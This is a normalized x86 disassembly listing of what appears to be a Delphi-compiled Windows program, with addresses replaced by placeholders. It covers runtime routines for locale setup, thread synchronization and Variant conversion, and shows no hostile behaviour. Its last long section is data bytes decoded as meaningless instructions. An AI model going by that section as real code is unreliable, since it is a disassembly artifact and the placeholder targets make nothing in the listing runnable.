cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c520
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c7eb
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c3ac
call sub_40ad84
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40acd4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404034
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408090
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408090
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40ad20
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40ad20
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408090
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40ad20
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b00c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_404034
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b00c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_404034
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40ad20
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40acd4
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_404034
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40acd4
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404034
lea eax [ ebp - 0x8 ]
call sub_403fe0
lea eax [ ebp - 0xc ]
call sub_403fe0
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408090
test eax eax
jne r-xdata
call sub_40af5c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404078
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404078
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404360
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404360
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40ad20
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c7f2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404004
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408090
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40acd4
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408090
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404078
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404078
jmp r-xdata
sub_40c8a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c930
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ac88
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c937
lea eax [ ebp - 0x14 ]
call sub_403fe0
retn
sub_40c988
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4084d4
mov [ rw-data ] eax
sub_40ca0c
push ebx
push esi
push edi
push ebp
call sub_40361c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403280
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403604
sub_40ca74
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40ca5c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cafc
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407b44
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c9fc
mov [ ebp ] eax
sub_40cafc
push ebx
mov ebx eax
mov eax ebx
call sub_40ca5c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c9fc
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cb3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_40cbb0
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_40cc3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_40cc3c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cbf8
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40ca74
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40ca04
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c9e4
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40ca04
test eax eax
je r-xdata
mov eax edi
call sub_40cbf8
test bl bl
je r-xdata
mov eax edi
call sub_40cc2c
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c9e4
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c9f0
sub_40ccd8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ca74
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40ca04
mov eax ebx
call sub_40cc10
mov eax ebx
call sub_40cc04
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40caec
sub_40cd28
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40ca74
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cc1c
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c9f0
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c9e4
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cc1c
mov eax esi
call sub_40cc10
sub_40cd94
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ca74
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40caec
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c9e4
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cc10
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cc10
sub_40ce0c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40ce30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cea7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_40564c
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403344
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ceae
lea eax [ ebp - 0x4 ]
call sub_40564c
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403344
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40ce0c
test al al
jne r-xdata
mov al 0x1
sub_40cec8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40cf3a
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cf1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4044a0
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cf23
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d39c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d404
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d40b
retn
mov eax sub_40cf4c
call sub_403d8c
mov eax r-xdata
call sub_403db4
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bb4c
call sub_40bc50
call sub_40c988
call sub_40c520
mov eax rw-data
mov edx r-xdata
call sub_404034
sub_40d43c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d490
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d4ea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404268
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4080a8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4f1
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d4fc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d556
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404268
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4093e4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d55d
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d568
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d5c2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404268
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4093b8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5c9
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d5d4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d62e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404268
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40abfc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d635
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d640
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d69a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404268
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409410
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6a1
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d6ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d719
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404268
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408194
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d720
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
sub_40d72c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d78c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40936c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40480c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d793
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d79c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d7fc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a3bc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40480c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d803
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d80c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d870
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408230
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_40480c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d877
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40d8a0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d8cc
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d43c
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d46c
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d46c
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d478
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d484
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d490
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4fc
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d568
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d5d4
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d640
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ac
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d72c
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d79c
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d80c
mov eax r-xdata
call sub_40d8a0
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40dbd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dbfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc04
retn
sub_40dd38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ch 0x40
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ eax ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 8 + 0xc0040 ] ch
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc bh bl
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
fiadd [ eax ]
or al 0x0
outsd
jb r-xdata
lodsb [ esi ]
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jb r-xdata
in al 0xdd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
fld [ eax ]
or al 0x0
adc eax 0x72615645
jns r-xdata
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
outsb
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
shr [ esi + ebx * 8 + 0x40 ] 0x0
add [ eax ] al
ror [ eax - 0x22 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
call 0xffffffffec411f95
inc eax
add [ eax + 0x15004032 ] al
inc ebp
push esi
popad
jb r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x22 ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xdd
inc eax
add [ eax + eax ] cl
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
lea eax [ eax ]
sbb ch 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040dd ] al
add [ eax ] al
add [ edi + esi * 2 ] dh
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
loopne r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp st7
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
fild [ eax ]
or al 0x0
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
popad
outsb
je r-xdata
inc ebp
jb r-xdata
add ah ah
xor al 0x40
add al ch
xor al 0x40
jb r-xdata
add ah ah
